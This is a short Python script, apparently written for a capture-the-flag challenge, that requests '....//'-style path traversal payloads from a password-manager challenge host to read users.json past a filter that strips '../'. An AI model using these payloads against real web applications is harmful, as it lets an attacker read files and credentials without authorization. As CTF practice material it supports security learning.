import requests

def try_path(path):
    url = f'https://password-manager-web.chal.irisc.tf{path}'
    response = requests.get(url)
    print(f"\nTrying: {url}")
    print(f"Status: {response.status_code}")
    print(f"Response: {response.text[:200]}")  # First 200 chars
    return response

# Try various path traversal patterns
paths = [
    "/....//users.json",           # ..// after replacement
    "/....//.../users.json",      # Multiple levels
    "/....//....//users.json",    # Double traversal
    "/....//....//....//users.json",
]

for path in paths:
    try_path(path)
